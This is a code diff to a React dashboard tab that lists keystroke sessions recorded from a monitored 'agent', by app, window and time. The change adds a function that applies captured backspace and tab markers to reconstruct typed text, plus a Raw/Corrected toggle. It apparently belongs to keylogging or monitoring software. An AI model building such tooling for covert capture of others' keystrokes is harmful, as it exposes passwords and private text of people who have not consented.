@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useMemo, useState } from "react";
 import { Copy, Check } from "lucide-react";
 import { DataTable, type Column } from "./DataTable";
 import { api } from "../lib/api";
@@ -9,6 +9,25 @@ type Row = Record<string, unknown>;
 interface Props {
   agentId: string;
   refreshKey: number;
+}
+
+function applyKeyCorrections(raw: string): string {
+  const out: string[] = [];
+  const parts = raw.split(/(\[⌫\]|\[Del\]|\[⇥\])/g);
+  for (const p of parts) {
+    if (!p) continue;
+    if (p === "[⌫]") {
+      if (out.length > 0) out.pop();
+      continue;
+    }
+    if (p === "[Del]") continue;
+    if (p === "[⇥]") {
+      out.push("\t");
+      continue;
+    }
+    for (const ch of p) out.push(ch);
+  }
+  return out.join("");
 }
 
 function CopyableText({ text }: { text: string }) {
@@ -42,12 +61,7 @@ function CopyableText({ text }: { text: string }) {
 const COLUMNS: Column[] = [
   { key: "app", label: "App", className: "w-36 whitespace-nowrap" },
   { key: "window_title", label: "Window", className: "max-w-[200px]" },
-  {
-    key: "text",
-    label: "Keystrokes",
-    sortable: false,
-    render: (v) => <CopyableText text={String(v ?? "")} />,
-  },
+  { key: "text", label: "Keystrokes", sortable: false },
   {
     key: "updated_at",
     label: "Time",
@@ -59,6 +73,7 @@ const COLUMNS: Column[] = [
 export function KeysTab({ agentId, refreshKey }: Props) {
   const [rows, setRows] = useState<Row[]>([]);
   const [loading, setLoading] = useState(true);
+  const [corrected, setCorrected] = useState(true);
 
   useEffect(() => {
     // Only show the spinner on the very first load; silently refresh afterwards.
@@ -71,13 +86,37 @@ export function KeysTab({ agentId, refreshKey }: Props) {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [agentId, refreshKey]);
 
+  const columns = useMemo<Column[]>(() => {
+    return COLUMNS.map((c) => {
+      if (c.key !== "text") return c;
+      return {
+        ...c,
+        render: (v) => {
+          const raw = String(v ?? "");
+          const shown = corrected ? applyKeyCorrections(raw) : raw;
+          return <CopyableText text={shown} />;
+        },
+      };
+    });
+  }, [corrected]);
+
   return (
     <DataTable
       data={rows}
-      columns={COLUMNS}
+      columns={columns}
       searchPlaceholder="Search by app, window, or text…"
       isLoading={loading}
       emptyMessage="No keystroke sessions recorded yet"
+      toolbarRight={
+        <button
+          onClick={() => setCorrected((v) => !v)}
+          className="flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-medium
+                     border border-border bg-surface text-muted hover:text-primary transition-colors"
+          title="Toggle whether backspaces are applied"
+        >
+          {corrected ? "Corrected" : "Raw"}
+        </button>
+      }
     />
   );
 }
